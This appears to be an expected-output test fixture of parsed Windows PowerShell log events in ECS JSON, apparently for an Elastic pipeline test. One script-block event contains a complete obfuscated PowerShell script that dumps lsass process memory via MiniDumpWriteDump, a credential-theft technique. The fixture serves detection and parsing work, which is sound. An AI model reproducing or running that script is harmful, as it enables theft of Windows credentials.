{
    "expected": [
        {
            "@timestamp": "2020-05-13T09:04:04.755Z",
            "ecs": {
                "version": "8.17.0"
            },
            "event": {
                "category": [
                    "process"
                ],
                "code": "4105",
                "kind": "event",
                "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4105</EventID><Version>1</Version><Level>5</Level><Task>102</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-05-13T09:04:04.755232500Z'/><EventRecordID>790</EventRecordID><Correlation ActivityID='{dd68516a-2930-0000-5962-68dd3029d601}'/><Execution ProcessID='4204' ThreadID='1476'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>vagrant</Computer><Security UserID='S-1-5-21-1350058589-2282154016-2764056528-1000'/></System><EventData><Data Name='ScriptBlockId'>f4a378ab-b74f-41a7-a5ef-6dd55562fdb9</Data><Data Name='RunspaceId'>9c031e5c-8d5a-4b91-a12e-b3624970b623</Data></EventData></Event>",
                "provider": "Microsoft-Windows-PowerShell",
                "type": [
                    "start"
                ]
            },
            "host": {
                "name": "vagrant",
                "os": {
                    "family": "windows",
                    "type": "windows"
                }
            },
            "log": {
                "level": "verbose"
            },
            "powershell": {
                "file": {
                    "script_block_id": "f4a378ab-b74f-41a7-a5ef-6dd55562fdb9"
                },
                "runspace_id": "9c031e5c-8d5a-4b91-a12e-b3624970b623"
            },
            "process": {
                "pid": 4204
            },
            "related": {
                "hosts": [
                    "DESKTOP-6RJHI71"
                ],
                "user": [
                    "JohnDoe"
                ]
            },
            "tags": [
                "forwarded"
            ],
            "user": {
                "domain": "DESKTOP-6RJHI71",
                "id": "S-1-5-21-2882078887-1352635951-3305458046-1000",
                "name": "JohnDoe"
            },
            "winlog": {
                "activity_id": "{dd68516a-2930-0000-5962-68dd3029d601}",
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "computer_name": "vagrant",
                "event_id": "4105",
                "process": {
                    "pid": 4204,
                    "thread": {
                        "id": 1476
                    }
                },
                "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                "provider_name": "Microsoft-Windows-PowerShell",
                "record_id": "790",
                "user": {
                    "domain": "DESKTOP-6RJHI71",
                    "identifier": "S-1-5-21-2882078887-1352635951-3305458046-1000",
                    "name": "JohnDoe",
                    "type": "User"
                },
                "version": 1
            }
        },
        {
            "@timestamp": "2020-05-15T08:11:47.897Z",
            "destination": {
                "user": {
                    "domain": "DESKTOP-6RJHI71",
                    "name": "JohnDoe"
                }
            },
            "ecs": {
                "version": "8.17.0"
            },
            "event": {
                "category": [
                    "process"
                ],
                "code": "4103",
                "kind": "event",
                "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-05-15T08:11:47.897949500Z'/><EventRecordID>3885</EventRecordID><Correlation ActivityID='{1aca0717-2acb-0002-c208-ca1acb2ad601}'/><Execution ProcessID='3984' ThreadID='3616'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>vagrant</Computer><Security UserID='S-1-5-21-1350058589-2282154016-2764056528-1000'/></System><EventData><Data Name='ContextInfo'>        Severity = Informational\n        Host Name = ServerRemoteHost\n        Host Version = 1.0.0.0\n        Host ID = ed57761b-ba0f-4d11-87d9-fac33820d20e\n        Host Application = C:\\Windows\\system32\\wsmprovhost.exe -Embedding\n        Engine Version = 5.1.17763.1007\n        Runspace ID = 0729459a-8646-4176-8b02-024421a9632e\n        Pipeline ID = 1\n        Command Name = cmd.exe\n        Command Type = Application\n        Script Name =\n        Command Path = C:\\Windows\\system32\\cmd.exe\n        Sequence Number = 34\n        User = VAGRANT\\vagrant\n        Connected User = VAGRANT\\vagrant\n        Shell ID = Microsoft.PowerShell\n</Data><Data Name='UserData'></Data><Data Name='Payload'>CommandInvocation(cmd.exe): \"cmd.exe\"\nCommandInvocation(Out-Null): \"Out-Null\"\nParameterBinding(Out-Null): name=\"InputObject\"; value=\"symbolic link created for C:\\vagrant &lt;&lt;===&gt;&gt; \\\\vboxsvr\\vagrant\"\n</Data></EventData></Event>\n<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-05-15T08:13:06.703293900Z'/><EventRecordID>3917</EventRecordID><Correlation ActivityID='{1aca0717-2acb-0003-db0b-ca1acb2ad601}'/><Execution ProcessID='5032' ThreadID='4160'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>vagrant</Computer><Security UserID='S-1-5-21-1350058589-2282154016-2764056528-1000'/></System><EventData><Data Name='ContextInfo'>        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.1007\n        Host ID = aae5217d-054f-435f-9968-4b5bebf12116\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -command 'C:\\Gopath\\src\\github.com\\elastic\\beats'\n        Engine Version = 5.1.17763.1007\n        Runspace ID = a87e8389-57c7-4997-95ff-f82f644965bf\n        Pipeline ID = 9\n        Command Name = Resolve-Path\n        Command Type = Cmdlet\n        Script Name =\n        Command Path =\n        Sequence Number = 22\n        User = VAGRANT\\vagrant\n        Connected User =\n        Shell ID = Microsoft.PowerShell\n</Data><Data Name='UserData'></Data><Data Name='Payload'>CommandInvocation(Resolve-Path): \"Resolve-Path\"\nParameterBinding(Resolve-Path): name=\"ErrorAction\"; value=\"Ignore\"\nParameterBinding(Resolve-Path): name=\"WarningAction\"; value=\"Ignore\"\nParameterBinding(Resolve-Path): name=\"InformationAction\"; value=\"Ignore\"\nParameterBinding(Resolve-Path): name=\"Verbose\"; value=\"False\"\nParameterBinding(Resolve-Path): name=\"Debug\"; value=\"False\"\nParameterBinding(Resolve-Path): name=\"Path\"; value=\"C:\\Gopath\\src\\github.com\\elastic\\beats\\x*\"\n</Data></EventData></Event>",
                "provider": "Microsoft-Windows-PowerShell",
                "sequence": 34,
                "type": [
                    "info"
                ]
            },
            "host": {
                "name": "vagrant",
                "os": {
                    "family": "windows",
                    "type": "windows"
                }
            },
            "log": {
                "level": "information"
            },
            "powershell": {
                "command": {
                    "invocation_details": [
                        {
                            "related_command": "cmd.exe",
                            "type": "CommandInvocation",
                            "value": "\"cmd.exe\""
                        },
                        {
                            "related_command": "Out-Null",
                            "type": "CommandInvocation",
                            "value": "\"Out-Null\""
                        },
                        {
                            "name": "\"InputObject\"",
                            "related_command": "Out-Null",
                            "type": "ParameterBinding",
                            "value": "\"symbolic link created for C:\\vagrant <<===>> \\\\vboxsvr\\vagrant\""
                        }
                    ],
                    "name": "cmd.exe",
                    "path": "C:\\Windows\\system32\\cmd.exe",
                    "type": "Application"
                },
                "engine": {
                    "version": "5.1.17763.1007"
                },
                "id": "Microsoft.PowerShell",
                "pipeline_id": "1",
                "process": {
                    "executable_version": "1.0.0.0"
                },
                "runspace_id": "0729459a-8646-4176-8b02-024421a9632e"
            },
            "process": {
                "args": [
                    "C:\\Windows\\system32\\wsmprovhost.exe",
                    "-Embedding"
                ],
                "args_count": 2,
                "command_line": "C:\\Windows\\system32\\wsmprovhost.exe -Embedding",
                "entity_id": "ed57761b-ba0f-4d11-87d9-fac33820d20e",
                "pid": 3984,
                "title": "ServerRemoteHost"
            },
            "related": {
                "hosts": [
                    "DESKTOP-6RJHI71"
                ],
                "user": [
                    "JohnDoe",
                    "vagrant"
                ]
            },
            "source": {
                "user": {
                    "domain": "VAGRANT",
                    "name": "vagrant"
                }
            },
            "tags": [
                "forwarded"
            ],
            "user": {
                "domain": "VAGRANT",
                "id": "S-1-5-21-2882078887-1352635951-3305458046-1000",
                "name": "vagrant"
            },
            "winlog": {
                "activity_id": "{1aca0717-2acb-0002-c208-ca1acb2ad601}",
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "computer_name": "vagrant",
                "event_id": "4103",
                "process": {
                    "pid": 3984,
                    "thread": {
                        "id": 3616
                    }
                },
                "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                "provider_name": "Microsoft-Windows-PowerShell",
                "record_id": "3885",
                "user": {
                    "domain": "DESKTOP-6RJHI71",
                    "identifier": "S-1-5-21-2882078887-1352635951-3305458046-1000",
                    "name": "JohnDoe",
                    "type": "User"
                },
                "version": 1
            }
        },
        {
            "@timestamp": "2020-05-13T10:40:32.595Z",
            "ecs": {
                "version": "8.17.0"
            },
            "event": {
                "category": [
                    "process"
                ],
                "code": "4106",
                "kind": "event",
                "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4106</EventID><Version>1</Version><Level>5</Level><Task>103</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-05-13T10:40:32.595715200Z'/><EventRecordID>933</EventRecordID><Correlation ActivityID='{e3200b8a-290e-0002-332a-20e30e29d601}'/><Execution ProcessID='4776' ThreadID='5092'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>vagrant</Computer><Security UserID='S-1-5-21-1350058589-2282154016-2764056528-1000'/></System><EventData><Data Name='ScriptBlockId'>4c487c13-46f7-4485-925b-34855c7e873c</Data><Data Name='RunspaceId'>3f1a9181-0523-4645-a42c-2c1868c39332</Data></EventData></Event>",
                "provider": "Microsoft-Windows-PowerShell",
                "type": [
                    "end"
                ]
            },
            "host": {
                "name": "vagrant",
                "os": {
                    "family": "windows",
                    "type": "windows"
                }
            },
            "log": {
                "level": "verbose"
            },
            "powershell": {
                "file": {
                    "script_block_id": "4c487c13-46f7-4485-925b-34855c7e873c"
                },
                "runspace_id": "3f1a9181-0523-4645-a42c-2c1868c39332"
            },
            "process": {
                "pid": 4776
            },
            "related": {
                "hosts": [
                    "DESKTOP-6RJHI71"
                ],
                "user": [
                    "JohnDoe"
                ]
            },
            "tags": [
                "forwarded"
            ],
            "user": {
                "domain": "DESKTOP-6RJHI71",
                "id": "S-1-5-21-2882078887-1352635951-3305458046-1000",
                "name": "JohnDoe"
            },
            "winlog": {
                "activity_id": "{e3200b8a-290e-0002-332a-20e30e29d601}",
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "computer_name": "vagrant",
                "event_id": "4106",
                "process": {
                    "pid": 4776,
                    "thread": {
                        "id": 5092
                    }
                },
                "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                "provider_name": "Microsoft-Windows-PowerShell",
                "record_id": "933",
                "user": {
                    "domain": "DESKTOP-6RJHI71",
                    "identifier": "S-1-5-21-2882078887-1352635951-3305458046-1000",
                    "name": "JohnDoe",
                    "type": "User"
                },
                "version": 1
            }
        },
        {
            "@timestamp": "2020-05-14T11:33:51.389Z",
            "ecs": {
                "version": "8.17.0"
            },
            "event": {
                "category": [
                    "process"
                ],
                "code": "4104",
                "kind": "event",
                "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-05-14T11:33:51.389266200Z'/><EventRecordID>3580</EventRecordID><Correlation ActivityID='{fb13c9de-29f7-0001-18e0-13fbf729d601}'/><Execution ProcessID='4844' ThreadID='4428'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>vagrant</Computer><Security UserID='S-1-5-21-1350058589-2282154016-2764056528-1000'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>.\\patata.ps1</Data><Data Name='ScriptBlockId'>50d2dbda-7361-4926-a94d-d9eadfdb43fa</Data><Data Name='Path'></Data></EventData></Event>\n<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-05-14T11:33:51.393884800Z'/><EventRecordID>3582</EventRecordID><Correlation ActivityID='{fb13c9de-29f7-0000-79db-13fbf729d601}'/><Execution ProcessID='4844' ThreadID='4428'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>vagrant</Computer><Security UserID='S-1-5-21-1350058589-2282154016-2764056528-1000'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'></Data><Data Name='ScriptBlockId'>f5521cbd-656e-4296-b74d-9ffb4eec23b0</Data><Data Name='Path'>C:\\Users\\vagrant\\Desktop\\patata.ps1</Data></EventData></Event>",
                "provider": "Microsoft-Windows-PowerShell",
                "type": [
                    "info"
                ]
            },
            "host": {
                "name": "vagrant",
                "os": {
                    "family": "windows",
                    "type": "windows"
                }
            },
            "log": {
                "level": "verbose"
            },
            "powershell": {
                "file": {
                    "script_block_entropy_bits": 4.947922042402605,
                    "script_block_hash": "r0sdjfD0qsH7ckPwQpUfLLA0Slo=",
                    "script_block_id": "50d2dbda-7361-4926-a94d-d9eadfdb43fa",
                    "script_block_length": 3350,
                    "script_block_surprisal_stdev": 1.760352963786286,
                    "script_block_text": "###\n# ==++==\n#\n# Copyright (c) Microsoft Corporation. All rights reserved.\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n###\n@{\n    GUID = \"4ae9fd46-338a-459c-8186-07f910774cb8\"\n    Author = \"Microsoft Corporation\"\n    CompanyName = \"Microsoft Corporation\"\n    Copyright = \"(C) Microsoft Corporation. All rights reserved.\"\n    HelpInfoUri = \"https://go.microsoft.com/fwlink/?linkid=2113634\"\n    ModuleVersion = \"1.4.8.1\"\n    PowerShellVersion = \"3.0\"\n    ClrVersion = \"4.0\"\n    RootModule = \"PackageManagement.psm1\"\n\tDescription = 'PackageManagement (a.k.a. OneGet) is a new way to discover and install software packages from around the web.\n It is a manager or multiplexor of existing package managers (also called package providers) that unifies Windows package management with a single Windows PowerShell interface. With PackageManagement, you can do the following.\n  - Manage a list of software repositories in which packages can be searched, acquired and installed\n  - Discover software packages\n  - Seamlessly install, uninstall, and inventory packages from one or more software repositories'\n\n    CmdletsToExport = @(\n        'Find-Package',\n        'Get-Package',\n        'Get-PackageProvider',\n        'Get-PackageSource',\n        'Install-Package',\n        'Import-PackageProvider'\n        'Find-PackageProvider'\n        'Install-PackageProvider'\n        'Register-PackageSource',\n        'Set-PackageSource',\n        'Unregister-PackageSource',\n        'Uninstall-Package'\n        'Save-Package'\n\t)\n\n\tFormatsToProcess  = @('PackageManagement.format.ps1xml')\n\n\tPrivateData = @{\n        PSData = @{\n            Tags = @('PackageManagement', 'PSEdition_Core', 'PSEdition_Desktop', 'Linux', 'Mac')\n            ProjectUri = 'https://oneget.org'\n            ReleaseNotes = @'\n## 1.4.8.1\n- Update PackageManagement's strong name signing\n\n## 1.4.8\n- Add NuGet as a source when generating nuget.config file for user in the NuGet Provider\n\n## 1.4.7\n- Update security protocol to use TLS 1.2\n- Remove catalog file\n\n## 1.4.6\n- Update `HelpInfoUri` to point to the latest content\n\n## 1.4.5\n- Bug fix for deadlock when getting parameters in an event\n\n## 1.4.4\n- Bug fix when installing modules from private feeds\n\n ## 1.4.3\n- Another bug fix when registering repositories with PowerShellGet\n\n## 1.4.2\n- Bug fix for passing credentials from PowerShellGet when registering repositories\n\n## 1.4.1\n- Bug fix for using credential provider installed in Visual Studio\n\n## 1.4\n- Allow credential persistance for registering private repositories and finding or installing packages from those repositories\n\n## 1.3.2\n- Enable bootstrap on PSCore\n- Bug fix to run on .NET Core 3.0\n\n## 1.3.1\n- Targets net452 and netstandard2.0 instead of net451, netcoreapp2.0, and netstandard1.6\n            \n## Previous releases are not included in this Changelog\n'@\n        }\n    }\n}\n\n# SIG # Begin signature block\n# MIInoQYJKoZIhvcNAQcCoIInkjCCJ44CAQExDzANBglghkgBZQMEAgEFADB5Bgor\n# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG\n# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCANw97w1D+bi5LY\n# 8ZEuubcA0tI0Z0h+CImFRYop+IIqQaCCDYEwggX/MIID56ADAgECAhMzAAACUosz\n# qviV8znbAAAAAAJSMA0GCSqGSIb3DQEBCwUAMH4xCzAJBgNVBAYTAlVTMRMwEQYD\n# +nC4D7IMA1+6smM7fbSJa7o4BHfyje8PHB3w9GF223mZTG0EhBlultQkMSpV/c88\n# 9hsbwx16Cr5sY9M/lSRt4oC3qzSuTmYd6VYJ/ILt9ptrpOkaYCiXXRx8Cfz7w53w\n# Au/J8xJjNWvrKxkcc8XiUXPfGGTXujyiS2MqvztBkg6wCduFKqogmvOtQiiwQQxE\n# G6lU/rss27omoTUc41EawOr1km5y+fUS9aoYX9K8NNhFH6TSni3dp/+Hiyif1T7X\n# g0cBy4yHuYxMmRrFcmGeplW3KhXHfkJjbHaVs1QgnRfkgFuypwF5YoFWrW7Xgj+a\n# ZCDKSoYq45E4v0ryIvyu0shBoHQXREAzpBv3L9h5A9vEFQG4alCI57oSbdqJ1YIa\n# ggkTQHR2CWdB7FnQilCqqZjSnAtXYZh/RD+PX6fg1UyUUQf5ohnw951pQeKYTYHm\n# Fwut+RibzdbHEF/kLZr6SZsDupCv\n# SIG # End signature block",
                    "script_block_unique_symbols": 79
                },
                "sequence": 1,
                "total": 1
            },
            "process": {
                "pid": 4844
            },
            "related": {
                "hosts": [
                    "DESKTOP-6RJHI71"
                ],
                "user": [
                    "JohnDoe"
                ]
            },
            "tags": [
                "forwarded"
            ],
            "user": {
                "domain": "DESKTOP-6RJHI71",
                "id": "S-1-5-21-2882078887-1352635951-3305458046-1000",
                "name": "JohnDoe"
            },
            "winlog": {
                "activity_id": "{fb13c9de-29f7-0001-18e0-13fbf729d601}",
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "computer_name": "vagrant",
                "event_id": "4104",
                "process": {
                    "pid": 4844,
                    "thread": {
                        "id": 4428
                    }
                },
                "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                "provider_name": "Microsoft-Windows-PowerShell",
                "record_id": "3580",
                "user": {
                    "domain": "DESKTOP-6RJHI71",
                    "identifier": "S-1-5-21-2882078887-1352635951-3305458046-1000",
                    "name": "JohnDoe",
                    "type": "User"
                },
                "version": 1
            }
        },
        {
            "@timestamp": "2024-07-10T18:28:55.469Z",
            "ecs": {
                "version": "8.17.0"
            },
            "event": {
                "category": [
                    "process"
                ],
                "code": "4104",
                "kind": "event",
                "provider": "Microsoft-Windows-PowerShell",
                "type": [
                    "info"
                ]
            },
            "host": {
                "name": "kingslanding",
                "os": {
                    "family": "windows",
                    "type": "windows"
                }
            },
            "log": {
                "level": "verbose"
            },
            "powershell": {
                "file": {
                    "script_block_entropy_bits": 4.999389346653313,
                    "script_block_hash": "UqkTOrIKrALdr6uz7n5JWUnSHs8=",
                    "script_block_id": "d5325f44-dfca-48a1-aa4f-9bfee88c3d48",
                    "script_block_length": 1599,
                    "script_block_surprisal_stdev": 1.7385527153601164,
                    "script_block_text": "$DumpFilePath = $PWD\n$WER = [PSObject].Assembly.GetType(((\"{0}{1}\" -f'Sy','st')+(\"{0}{1}\" -f 'em','.M')+'ana'+(\"{1}{0}\" -f 'e','gem')+(\"{0}{1}\"-f 'n',(\"{0}{2}{1}\" -f't.','ma','Auto'))+'ti'+(\"{1}{0}{2}\" -f(\"{2}{0}{1}\" -f 'W','indow','n.'),'o','s')+'E'+'rro'+(\"{0}{1}{2}\"-f'r',(\"{0}{1}\" -f'Rep','o'),'rt')+'ing'))\n$WERNativeMethods = $WER.GetNestedType(('Na'+'tiv'+(\"{0}{2}{1}\" -f 'e','s',(\"{1}{0}\" -f'od','Meth'))), ('Non'+'Pu'+(\"{0}{1}\" -f'bl','ic')))\n$Flags = [Reflection.BindingFlags] ((\"{1}{0}\"-f'P','Non')+(\"{1}{0}\"-f 'li','ub')+'c'+(\"{0}{1}\"-f(\"{1}{0}\" -f'ta',', S'),'tic'))\n$MiniDumpWriteDump = $WERNativeMethods.GetMethod(((\"{0}{1}\"-f'Min','i')+(\"{1}{2}{0}\"-f(\"{0}{1}\" -f'p','Write'),'Du','m')+'D'+'u'+'m'+'p'), $Flags)\n$MiniDumpWithFullMemory = [UInt32] 2\n$la = 'ls'\n$ss = ('a'+'ss')\n$Process = Get-Process $la$ss\n$ProcessId = $Process.Id\n$ProcessName = $Process.Name\n$ProcessHandle = $Process.Handle\n$ProcessFileName = \"$($ProcessName)_$($ProcessId).dmp\"\n$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName\n$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)\n$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\n                                             $ProcessId,\n                                             $FileStream.SafeFileHandle,\n                                             $MiniDumpWithFullMemory,\n                                             [IntPtr]::Zero,\n                                             [IntPtr]::Zero,\n                                             [IntPtr]::Zero))\n$FileStream.Close()\nGet-ChildItem $ProcessDumpPath",
                    "script_block_unique_symbols": 66
                },
                "sequence": 1,
                "total": 1
            },
            "process": {
                "pid": 4696
            },
            "tags": [
                "forwarded"
            ],
            "user": {
                "id": "S-1-5-21-3715621034-4113696668-281506975-1117"
            },
            "winlog": {
                "activity_id": "{fb13c9de-29f7-0001-18e0-13fbf729d601}",
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "computer_name": "kingslanding.sevenkingdoms.local",
                "event_id": "4104",
                "process": {
                    "pid": 4696,
                    "thread": {
                        "id": 11556
                    }
                },
                "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                "provider_name": "Microsoft-Windows-PowerShell",
                "record_id": "3944",
                "user": {
                    "identifier": "S-1-5-21-3715621034-4113696668-281506975-1117"
                },
                "version": 1
            }
        },
        {
            "@timestamp": "2023-06-01T05:27:01.247Z",
            "ecs": {
                "version": "8.17.0"
            },
            "event": {
                "action": "Executing Pipeline",
                "category": [
                    "process"
                ],
                "code": "4103",
                "kind": "event",
                "provider": "Microsoft-Windows-PowerShell",
                "sequence": 7216833,
                "type": [
                    "info"
                ]
            },
            "host": {
                "name": "host.contoso.com",
                "os": {
                    "family": "windows",
                    "type": "windows"
                }
            },
            "log": {
                "level": "information"
            },
            "message": "CommandInvocation(Get-ItemProperty): \"Get-ItemProperty\"\nParameterBinding(Get-ItemProperty): name=\"Path\"; value=\"hklm:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\"\nParameterBinding(Get-ItemProperty): name=\"Name\"; value=\"Authentication Packages\"\nCommandInvocation(Select-Object): \"Select-Object\"\nParameterBinding(Select-Object): name=\"ExpandProperty\"; value=\"Authentication Packages\"\nParameterBinding(Select-Object): name=\"InputObject\"; value=\"@{Authentication Packages=System.String[]; PSPath=Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa; PSParentPath=Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control; PSChildName=Lsa; PSDrive=HKLM; PSProvider=Microsoft.PowerShell.Core\\Registry}\"\n\n\nContext:\n        Severity = Informational\n        Host Name = OpsMgr PowerShell Host\n        Host Version = 7.0.5000.0\n        Host ID = b0c2607f-a734-4f24-8f75-fb6e7b79d116\n        Host Application = C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\MonitoringHost.exe -Embedding\n        Engine Version = 5.1.17763.3770\n        Runspace ID = 860aba3e-ecbc-48d8-beaa-b5c19b845dfb\n        Pipeline ID = 2\n        Command Name = Get-ItemProperty\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 7213\n        User = CONTOSO\\SYSTEM\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:",
            "powershell": {
                "command": {
                    "invocation_details": [
                        {
                            "related_command": "Get-ItemProperty",
                            "type": "CommandInvocation",
                            "value": "\"Get-ItemProperty\""
                        },
                        {
                            "name": "\"Path\"",
                            "related_command": "Get-ItemProperty",
                            "type": "ParameterBinding",
                            "value": "\"hklm:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\""
                        },
                        {
                            "name": "\"Name\"",
                            "related_command": "Get-ItemProperty",
                            "type": "ParameterBinding",
                            "value": "\"Authentication Packages\""
                        },
                        {
                            "related_command": "Select-Object",
                            "type": "CommandInvocation",
                            "value": "\"Select-Object\""
                        },
                        {
                            "name": "\"ExpandProperty\"",
                            "related_command": "Select-Object",
                            "type": "ParameterBinding",
                            "value": "\"Authentication Packages\""
                        },
                        {
                            "name": "\"InputObject\"",
                            "related_command": "Select-Object",
                            "type": "ParameterBinding",
                            "value": "\"@{Authentication Packages=System.String[]; PSPath=Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa; PSParentPath=Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control; PSChildName=Lsa; PSDrive=HKLM; PSProvider=Microsoft.PowerShell.Core\\Registry}\""
                        }
                    ],
                    "name": "Get-ItemProperty",
                    "type": "Cmdlet"
                },
                "engine": {
                    "version": "5.1.17763.3770"
                },
                "id": "Microsoft.PowerShell",
                "pipeline_id": "2",
                "process": {
                    "executable_version": "7.0.5000.0"
                },
                "runspace_id": "9f8ee3e6-561c-4875-a882-a352509348b8"
            },
            "process": {
                "args": [
                    "C:\\Program",
                    "Files\\Microsoft",
                    "Monitoring",
                    "Agent\\Agent\\MonitoringHost.exe",
                    "-Embedding"
                ],
                "args_count": 5,
                "command_line": "C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\MonitoringHost.exe -Embedding",
                "entity_id": "1c251f62-545d-4d71-901e-b3445e459c2c",
                "pid": 2349,
                "title": "OpsMgr PowerShell Host"
            },
            "related": {
                "hosts": [
                    "DESKTOP-6RJHI71"
                ],
                "user": [
                    "JohnDoe"
                ]
            },
            "user": {
                "domain": "DESKTOP-6RJHI71",
                "id": "S-1-5-21-2882078887-1352635951-3305458046-1000",
                "name": "JohnDoe"
            },
            "winlog": {
                "activity_id": "{a5ce6d2b-8964-4ec4-b0a3-1e749f8aa4ad}",
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "computer_name": "host.contoso.com",
                "event_id": "4103",
                "opcode": "To be used when operation is just executing a method",
                "process": {
                    "pid": 2349,
                    "thread": {
                        "id": 32444
                    }
                },
                "provider_guid": "{92a98569-96ac-46a7-af87-1eba79f456ee}",
                "provider_name": "Microsoft-Windows-PowerShell",
                "record_id": "5663677",
                "task": "Executing Pipeline",
                "user": {
                    "domain": "DESKTOP-6RJHI71",
                    "identifier": "S-1-5-21-2882078887-1352635951-3305458046-1000",
                    "name": "JohnDoe",
                    "type": "User"
                },
                "version": 1
            }
        }
    ]
}
